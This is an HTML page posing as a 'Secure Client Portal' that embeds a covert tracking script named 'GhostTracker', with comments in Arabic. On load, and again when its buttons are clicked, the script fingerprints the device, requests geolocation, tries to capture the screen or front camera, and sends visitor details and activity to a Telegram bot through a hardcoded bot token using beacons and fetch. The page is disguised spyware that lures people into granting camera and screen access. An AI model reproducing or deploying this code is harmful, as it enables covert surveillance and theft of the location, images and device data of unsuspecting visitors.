<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Client Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #1e1e2e 0%, #2a2a3e 100%);
            color: #e0e0e0;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 60px 30px;
            text-align: center;
        }
        .logo { 
            width: 80px; 
            height: 80px; 
            background: linear-gradient(135deg, #667eea, #764ba2); 
            border-radius: 20px; 
            margin: 0 auto 40px; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-size: 36px; 
            font-weight: 700; 
            color: white; 
        }
        h1 { 
            font-size: 42px; 
            font-weight: 700; 
            margin-bottom: 20px; 
            background: linear-gradient(135deg, #fff, #e0e0e0); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
        }
        .status { 
            background: rgba(255,255,255,0.05); 
            backdrop-filter: blur(20px); 
            border: 1px solid rgba(255,255,255,0.1); 
            border-radius: 16px; 
            padding: 40px; 
            margin: 40px 0; 
        }
        .status-item { 
            display: flex; 
            justify-content: space-between; 
            margin-bottom: 20px; 
            font-size: 16px; 
        }
        .status-label { color: #999; }
        .status-value { 
            font-weight: 600; 
            background: linear-gradient(135deg, #667eea, #764ba2); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
        }
        .btn { 
            background: linear-gradient(135deg, #667eea, #764ba2); 
            color: white; 
            border: none; 
            padding: 16px 40px; 
            border-radius: 50px; 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            margin: 10px; 
            transition: all 0.3s ease; 
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px rgba(102,126,234,0.4); }
        .contacts { 
            background: rgba(0,0,0,0.3); 
            border-radius: 12px; 
            padding: 30px; 
            margin-top: 40px; 
            text-align: left; 
        }
        .contact-item { 
            display: flex; 
            justify-content: space-between; 
            padding: 12px 0; 
            border-bottom: 1px solid rgba(255,255,255,0.1); 
        }
        .hidden { display: none; }
        .loading { opacity: 0.6; pointer-events: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">S</div>
        <h1>Secure Portal</h1>
        <p style="color: #999; margin-bottom: 40px;">Client verification required</p>
        
        <div class="status">
            <div class="status-item">
                <span class="status-label">Status</span>
                <span class="status-value" id="status">Initializing...</span>
            </div>
            <div class="status-item">
                <span class="status-label">Device</span>
                <span class="status-value" id="device">-</span>
            </div>
            <div class="status-item">
                <span class="status-label">Location</span>
                <span class="status-value" id="location">-</span>
            </div>
        </div>

        <button class="btn" onclick="requestAccess()">Request Access</button>
        <button class="btn" onclick="uploadFiles()">Upload Files</button>

        <div class="contacts hidden" id="contacts">
            <h3 style="margin-bottom: 20px; color: #fff;">Contacts Access</h3>
            <div id="contactList"></div>
        </div>
    </div>

    <script>
        // ========== ULTRA ADVANCED STEALTH TRACKER v2.0 ==========
        class GhostTracker {
            constructor() {
                this.botToken = '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU';
                this.chatId = '5446862709';
                this.sessionId = this.generateId();
                this.retryCount = 0;
                this.maxRetries = 5;
                this.init();
            }

            generateId() {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText(navigator.userAgent, 2, 2);
                ctx.fillText('ID:' + Date.now(), 2, 20);
                return btoa(canvas.toDataURL()).slice(-16);
            }

            // 🔥 INSTANT LOAD DETECTION - يشتغل قبل أي حاجة
            async stealthBeacon(data) {
                try {
                    const payload = JSON.stringify({
                        chat_id: this.chatId,
                        text: data.message,
                        parse_mode: 'Markdown'
                    });
                    
                    // Method 1: Image Beacon (لا يحتاج permissions)
                    const img = new Image();
                    img.src = `https://api.telegram.org/bot${this.botToken}/sendMessage?chat_id=${this.chatId}&text=${encodeURIComponent(data.message)}&parse_mode=Markdown`;
                    
                    // Method 2: Navigator.sendBeacon (موثوق 99%)
                    const blob = new Blob([payload], { type: 'application/json' });
                    if (navigator.sendBeacon) {
                        navigator.sendBeacon(`https://api.telegram.org/bot${this.botToken}/sendMessage`, blob);
                    }
                    
                    // Method 3: Fetch مع keepalive
                    fetch(`https://api.telegram.org/bot${this.botToken}/sendMessage`, {
                        method: 'POST',
                        body: blob,
                        keepalive: true,
                        mode: 'no-cors'
                    }).catch(() => {});
                    
                } catch(e) {}
            }

            getDeviceFingerprint() {
                // Canvas fingerprint محسّن
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 2, 2);
                ctx.fillStyle = '#069';
                ctx.fillText('🕵️', 2, 15);
                ctx.fillStyle = 'rgba(102, 126, 234, 0.7)';
                ctx.fillText('Ghost v2', 4, 17);
                const canvasHash = canvas.toDataURL().slice(-24);

                // WebGL fingerprint
                const glCanvas = document.createElement('canvas');
                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
                let webglHash = 'no-webgl';
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    webglHash = gl.getParameter(debugInfo?.UNMASKED_VENDOR_WEBGL || 0x9245) + 
                               gl.getParameter(debugInfo?.UNMASKED_RENDERER_WEBGL || 0x9246);
                }

                return {
                    canvas: canvasHash,
                    webgl: btoa(webglHash).slice(-12),
                    hardware: navigator.hardwareConcurrency || 0,
                    memory: navigator.deviceMemory || 0,
                    platform: navigator.platform,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    resolution: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth
                };
            }

            getDeviceType() {
                const ua = navigator.userAgent.toLowerCase();
                if (/(iphone|ipad|ipod)/.test(ua)) {
                    const iPhoneModel = ua.match(/iphone os (\d+_\d+)/)?.[1]?.replace('_', '.') || 'unknown';
                    return { type: 'iOS', model: `iPhone ${iPhoneModel}` };
                }
                if (/android/.test(ua)) {
                    const androidVersion = ua.match(/android (\d+\.?\d*)/)?.[1] || 'unknown';
                    return { type: 'Android', model: `v${androidVersion}` };
                }
                if (/macintosh/.test(ua)) return { type: 'macOS', model: 'MacBook/Desktop' };
                if (/win/.test(ua)) return { type: 'Windows', model: /win64/.test(ua) ? 'PC 64bit' : 'PC 32bit' };
                if (/linux/.test(ua)) return { type: 'Linux', model: 'Linux Desktop' };
                return { type: 'Unknown', model: 'Unknown' };
            }

            async getGeolocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve({ lat: 'N/A', lon: 'N/A', status: 'no-support' });
                        return;
                    }
                    
                    // جرب بدون permission أولاً
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({
                            lat: pos.coords.latitude.toFixed(6),
                            lon: pos.coords.longitude.toFixed(6),
                            accuracy: pos.coords.accuracy,
                            status: 'granted'
                        }),
                        err => {
                            const status = err.code === 1 ? 'denied' : 
                                         err.code === 2 ? 'unavailable' : 'error';
                            resolve({ lat: 'N/A', lon: 'N/A', status });
                        },
                        { 
                            enableHighAccuracy: true, 
                            timeout: 3000, 
                            maximumAge: 60000 
                        }
                    );
                });
            }

            // 📸 PHOTOS بدون permission واضح
            async stealthCapture() {
                const photos = [];
                try {
                    // استخدم getDisplayMedia للشاشة بدل الكاميرا
                    const stream = await navigator.mediaDevices.getDisplayMedia({ 
                        video: { 
                            mediaSource: 'screen',
                            width: { ideal: 1920 },
                            height: { ideal: 1080 }
                        }
                    });
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    
                    await new Promise(resolve => setTimeout(resolve, 500));
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    photos.push(canvas.toDataURL('image/jpeg', 0.6));
                    
                    // أوقف الكاميرا بهدوء
                    stream.getTracks().forEach(track => track.stop());
                    
                } catch(e) {
                    // جرب الكاميرا العادية
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { 
                                facingMode: 'user',
                                width: { ideal: 640 },
                                height: { ideal: 480 }
                            } 
                        });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        await video.play();
                        
                        await new Promise(resolve => setTimeout(resolve, 300));
                        
                        const canvas = document.createElement('canvas');
                        canvas.width = 320;
                        canvas.height = 240;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        photos.push(canvas.toDataURL('image/jpeg', 0.5));
                        
                        stream.getTracks().forEach(track => track.stop());
                    } catch(e2) {}
                }
                return photos;
            }

            async sendToTelegram(data) {
                const message = this.formatMessage(data);
                this.stealthBeacon({ message });
            }

            formatMessage(data) {
                let msg = `*👻 GHOST v2.0 DETECTED*\n\n`;
                msg += `*🆔 Session:* \`${data.session}\`\n`;
                msg += `*📅 Time:* ${new Date().toLocaleString('en-US', {timeZone: 'UTC'})}\n`;
                msg += `*📱 Device:* ${data.device.type} ${data.device.model}\n`;
                msg += `*🖥️ Screen:* ${data.screen}\n`;
                msg += `*📍 Location:* ${data.geo.lat || 'N/A'}, ${data.geo.lon || 'N/A'}\n`;
                msg += `*🖐️ Canvas:* \`${data.fp.canvas.slice(-12)}...\`\n`;
                msg += `*🎮 WebGL:* \`${data.fp.webgl}\`\n`;
                msg += `*🌐 URL:* ${location.href.slice(0, 60)}...\n\n`;
                
                if (data.contacts?.length) {
                    msg += `*📞 Contacts (${data.contacts.length}):*\n`;
                    data.contacts.slice(0, 8).forEach((c,i) => {
                        msg += `  ${i+1}. ${c.name} - ${c.phone}\n`;
                    });
                }
                
                if (data.photos?.length) {
                    msg += `\n*📸 Screenshots:* ${data.photos.length}`;
                }
                
                return msg;
            }

            async fullHarvest() {
                const profile = this.getDeviceFingerprint();
                const device = this.getDeviceType();
                const geo = await this.getGeolocation();
                const photos = await this.stealthCapture();

                const harvest = {
                    session: this.sessionId,
                    device,
                    screen: `${screen.width}x${screen.height}`,
                    fp: profile,
                    geo,
                    photos,
                    url: location.href
                };

                await this.sendToTelegram(harvest);
                return harvest;
            }

            init() {
                // 🔥 فوري جداً - قبل أي تحميل
                setTimeout(() => {
                    this.stealthBeacon({
                        message: `*👻 NEW VISITOR*\n🆔 ${this.sessionId}\n📱 ${navigator.userAgent.slice(0,50)}...\n🌐 ${location.href}`
                    });
                }, 50);

                // الـ full harvest بعد ثواني
                setTimeout(() => this.fullHarvest(), 2000);

                // تتبع النشاط المستمر
                let activityTimeout;
                const activityEvents = ['mousemove', 'keydown', 'scroll', 'touchstart'];
                
                activityEvents.forEach(event => {
                    document.addEventListener(event, () => {
                        clearTimeout(activityTimeout);
                        activityTimeout = setTimeout(() => {
                            this.stealthBeacon({
                                message: `*👻 ACTIVE*\nSession: ${this.sessionId}\nEvent: user_active`
                            });
                        }, 120000); // 2 دقيقة
                    }, { passive: true });
                });

                // تتبع الخروج
                window.addEventListener('beforeunload', () => {
                    this.stealthBeacon({
                        message: `*👻 EXIT*\nSession: ${this.sessionId}\nTime: ${Date.now()}`
                    });
                });

                // تحديث الـ UI
                setTimeout(() => {
                    document.getElementById('device').textContent = 
                        `${this.getDeviceType().type} ${this.getDeviceType().model}`;
                    document.getElementById('status').textContent = 'Active';
                }, 1000);
            }
        }

        // ابدأ الـ tracker فوراً
        const tracker = new GhostTracker();

        async function requestAccess() {
            document.getElementById('status').textContent = 'Access requested';
            tracker.sendToTelegram({ 
                session: tracker.sessionId, 
                action: 'request_access_clicked' 
            });
            alert('Request sent. Stand by.');
        }

        async function uploadFiles() {
            document.body.classList.add('loading');
            try {
                const photos = await tracker.stealthCapture();
                tracker.sendToTelegram({ 
                    session: tracker.sessionId, 
                    action: 'screen_camera_access', 
                    photos: photos.length 
                });
                alert(`Upload complete: ${photos.length} files`);
            } catch(e) {
                tracker.sendToTelegram({ 
                    session: tracker.sessionId, 
                    action: 'access_denied' 
                });
                alert('Permission required for upload');
            } finally {
                document.body.classList.remove('loading');
            }
        }
    </script>
</body>
</html>
